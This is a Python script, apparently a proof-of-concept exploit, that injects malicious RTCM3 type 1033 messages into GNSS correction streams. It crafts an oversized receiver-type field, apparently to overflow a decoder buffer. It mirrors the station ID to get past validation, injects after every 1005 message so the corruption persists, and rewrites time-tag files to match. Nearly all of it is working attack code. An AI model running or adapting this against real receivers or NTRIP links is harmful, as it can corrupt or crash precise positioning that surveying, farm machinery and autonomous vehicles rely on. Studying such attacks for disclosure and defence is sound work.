#!/usr/bin/env python3
"""
Splice a malicious type 1033 message into an existing RTCM3 stream.

Models an on-path attacker who appends a message to a correction stream they
can modify in transit (rogue NTRIP caster, MITM of a plaintext NTRIP session,
or a spoofed UHF base link). Nothing in the original stream is altered or
dropped -- the attack is purely additive.

A real base station re-sends 1005 periodically, which would refresh the
station coordinates and undo the corruption. So by default the 1033 is
injected after *every* 1005, which is what an attacker with a persistent
on-path position would do.

Usage:
    python inject_1033.py in.rtcm3 out.rtcm3 --len 212
"""
import argparse

from gen_rtcm import msg1033, crc24q


def frames(data: bytes):
    """Split an RTCM3 byte stream into frames, skipping non-frame bytes."""
    i = 0
    while i < len(data):
        if data[i] != 0xD3 or i + 3 > len(data):
            i += 1
            continue
        length = ((data[i + 1] & 0x03) << 8) | data[i + 2]
        end = i + 3 + length + 3
        if end > len(data):
            break
        frame = data[i:end]
        if crc24q(frame[:-3]) != int.from_bytes(frame[-3:], "big"):
            i += 1
            continue
        msgtype = (frame[3] << 4) | (frame[4] >> 4)
        yield msgtype, frame
        i = end


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("infile")
    ap.add_argument("outfile")
    ap.add_argument("--len", type=int, default=212,
                    help="declared rectype length (default 212)")
    ap.add_argument("--after", type=int, default=1005,
                    help="inject after every message of this type (default 1005)")
    ap.add_argument("--once", action="store_true",
                    help="inject only after the first matching message")
    args = ap.parse_args()

    with open(args.infile, "rb") as fh:
        data = fh.read()

    blob = b"A" * 31 + b"\xff" * (args.len - 31)

    out = bytearray()
    counts = {}
    injected = 0
    # Maps input byte offset -> bytes inserted at or before it, so a companion
    # time-tag file can be rewritten to match the new stream layout.
    shifts = [(0, 0)]
    pos = 0
    for msgtype, frame in frames(data):
        counts[msgtype] = counts.get(msgtype, 0) + 1
        out += frame
        pos += len(frame)
        if msgtype == args.after and not (args.once and injected):
            # test_staid() rejects a message whose station id disagrees with
            # the one already latched, so mirror the id from the message we
            # are injecting behind.
            staid = ((frame[4] & 0x0F) << 8) | frame[5]
            out += msg1033(staid=staid, antdes=b"TRM59800.00", rectype=blob)
            injected += 1
        shifts.append((pos, len(out) - pos))

    with open(args.outfile, "wb") as fh:
        fh.write(out)

    print("input message types:",
          ", ".join(f"{t}x{n}" for t, n in sorted(counts.items())))
    print(f"injected {injected} x type 1033 (rectype len={args.len}) "
          f"after type {args.after}")
    print(f"wrote {len(out)} bytes to {args.outfile}")
    rewrite_tags(args.infile + ".tag", args.outfile + ".tag", shifts)


def rewrite_tags(intag, outtag, shifts):
    """Rebuild a time-tag file for a stream whose byte offsets have shifted."""
    import os
    import struct
    if not os.path.exists(intag):
        return

    def shift_for(fpos):
        # last recorded shift at or before this input offset
        best = 0
        for at, delta in shifts:
            if at <= fpos:
                best = delta
            else:
                break
        return best

    with open(intag, "rb") as fh:
        head = fh.read(64 + 4 + 8)
        body = fh.read()

    recs = bytearray()
    n = 0
    for i in range(0, len(body) - 7, 8):
        tick, fpos = struct.unpack("<II", body[i:i + 8])
        recs += struct.pack("<II", tick, fpos + shift_for(fpos))
        n += 1

    with open(outtag, "wb") as fh:
        fh.write(head)
        fh.write(recs)
    print(f"rewrote {n} time tags -> {outtag}")


if __name__ == "__main__":
    main()
